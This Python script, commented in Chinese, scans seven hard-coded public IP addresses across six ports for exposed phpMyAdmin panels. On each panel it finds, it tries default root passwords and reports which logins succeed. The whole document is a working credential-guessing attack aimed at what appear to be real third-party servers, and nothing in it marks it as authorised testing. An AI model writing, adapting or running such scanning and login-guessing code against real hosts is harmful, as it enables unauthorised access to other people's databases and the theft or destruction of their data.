#!/usr/bin/env python3
"""7个Hunter IP全端口phpMyAdmin检查"""
import urllib.request, ssl, re, sys, time
from concurrent.futures import ThreadPoolExecutor

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

targets = [
    ("124.71.142.158", ["80","443","8080","8980","9096","8888"]),
    ("81.70.245.25", ["80","443","8080","8980","9096","8888"]),
    ("154.8.182.214", ["80","443","8080","8980","9096","8888"]),
    ("47.105.218.154", ["80","443","8080","8980","9096","8888"]),
    ("124.207.15.73", ["80","443","8080","8980","9096","8888"]),
    ("39.105.7.208", ["80","443","8080","8980","9096","8888"]),
    ("60.191.221.198", ["80","443","8080","8980","9096","8888"]),
]

def check_pma(ip, port):
    for path in ["/phpmyadmin/", "/phpMyAdmin/"]:
        try:
            req = urllib.request.Request(f"http://{ip}:{port}{path}", headers={"User-Agent":"Mozilla/5.0"})
            r = urllib.request.urlopen(req, timeout=4, context=ctx)
            body = r.read().decode("utf-8","ignore")
            if "phpMyAdmin" in body or "pma_username" in body:
                return path
        except Exception:
            pass
    return None

def try_login(ip, port, path, user, pw):
    try:
        cj = __import__("http.cookiejar").cookiejar.CookieJar()
        op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
        op.addheaders = [("User-Agent","Mozilla/5.0")]
        base = f"http://{ip}:{port}{path}"
        r = op.open(base, timeout=5)
        html = r.read().decode("utf-8","ignore")
        m = re.search(r'name="token" value="([a-f0-9]{32})"', html)
        if not m: return None
        data = f"pma_username={user}&pma_password={pw}&server=1&token={m.group(1)}".encode()
        op.open(urllib.request.Request(f"{base}index.php", data=data), timeout=5).read()
        r = op.open(f"{base}index.php", timeout=5)
        body = r.read().decode("utf-8","ignore")
        if "logout" in body or "navigation" in body or "server_databases" in body:
            return True
    except Exception:
        pass
    return None

for ip, ports in targets:
    for port in ports:
        path = check_pma(ip, port)
        if path:
            found = None
            for user, pw in [("root","root"),("root","123456"),("root","admin")]:
                if try_login(ip, port, path, user, pw):
                    found = f"{user}/{pw}"
                    break
            if found:
                print(f"!!! {ip}:{port} phpMyAdmin登录成功 {found} ({path})", flush=True)
            else:
                print(f"{ip}:{port} phpMyAdmin存在(弱口令失败) ({path})", flush=True)
print("DONE")
